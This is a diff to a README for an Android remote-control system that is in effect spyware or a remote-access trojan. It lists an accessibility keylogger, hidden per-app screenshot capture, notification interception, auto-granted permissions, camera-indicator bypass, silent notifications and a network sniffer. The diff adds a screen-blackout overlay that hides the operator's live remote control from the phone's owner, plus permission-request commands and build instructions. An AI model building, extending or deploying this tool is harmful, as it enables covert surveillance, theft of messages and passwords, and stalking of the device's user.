@@ -26,7 +26,8 @@ A three-component remote device management system:
 | `DeviceControl.jsx` | Per-device control with 6 tabs |
 | `CommandPanel.jsx` | All remote commands organized into categories |
 | `ResultPanel.jsx` | Shows command results with image/audio rendering |
-| `ScreenControl.jsx` | Live stream in phone frame (resolution-aware) + recording |
+| `ScreenControl.jsx` | Live stream in phone frame + Block Screen toggle + recording |
+| `PermissionsTab.jsx` | Shows all app permissions (granted/denied), with per-permission request buttons |
 | `ScreenReaderView.jsx` | Streaming UI tree viewer with visual phone frame overlay |
 | `KeyloggerTab.jsx` | Live keylog feed + per-day file download |
 | `AppManager.jsx` | App grid with open/stop/clear/disable/uninstall actions |
@@ -51,6 +52,8 @@ A three-component remote device management system:
 - **Notifications**: all, by app, clear
 - **Screen Ctrl**: gestures, navigation, text input (requires accessibility service)
 - **Screen Read**: UI tree dump, element search, streaming mode
+- **Screen Blackout**: `screen_blackout_on` / `screen_blackout_off` — blacks out device screen while dashboard keeps streaming
+- **Permissions**: `get_permissions`, `request_permission`, `request_all_permissions` — query and request runtime permissions
 - **Social Media**: quick access to WhatsApp/Instagram/Twitter/Facebook/Telegram/Snapchat/TikTok notifications
 
 ## Android Features
@@ -59,11 +62,14 @@ A three-component remote device management system:
 - **AppMonitor** — Per-monitored-app keylogs + screenshots stored offline under `.am/<pkg>/`; configured via `Constants.MONITORED_PACKAGES`
 - **UnifiedAccessibilityService** — Hooks `onTextChanged` and `onAppForeground` events to feed both KeyloggerService and AppMonitor
 - **SocketManager** — Routes all keylogger/app-monitor/app-manager commands; exposes `getKeylogger()` and `getAppMonitor()` accessors
+- **ScreenBlackout** — WindowManager TYPE_APPLICATION_OVERLAY overlay that blacks out the physical device screen; streaming briefly hides the overlay before each frame so the dashboard sees real content
+- **PermissionManager** — Queries and requests all app runtime permissions; opens Settings for Accessibility, Overlay, or App Details as needed
 
 ## Android App Capabilities
 
 The Android client supports all commands listed above plus:
 - Live screen streaming (MJPEG frames over WebSocket)
+- **Screen Blackout**: blacks out device screen while dashboard streams real content (requires SYSTEM_ALERT_WINDOW)
 - Auto-grant permissions via Accessibility Service
 - Keylogger via Accessibility Service
 - Notification interception for all apps
@@ -71,3 +77,9 @@ The Android client supports all commands listed above plus:
 - Stealth features (CameraIndicatorBypass, SilentNotificationManager)
 - Network sniffer (NetworkSniffer.java — autonomous, no command interface)
 - Social media notification monitoring (SocialMediaMonitor.java)
+
+## Build
+
+Android build output: `app/build/outputs/apk/debug/app-debug.apk`
+Build config: `settings.gradle`, `gradle.properties`, `local.properties`, `gradle/wrapper/gradle-wrapper.properties`
+Requires: Android SDK (platform-tools, platforms;android-34, build-tools;34.0.0), Java 17, Gradle 8.2
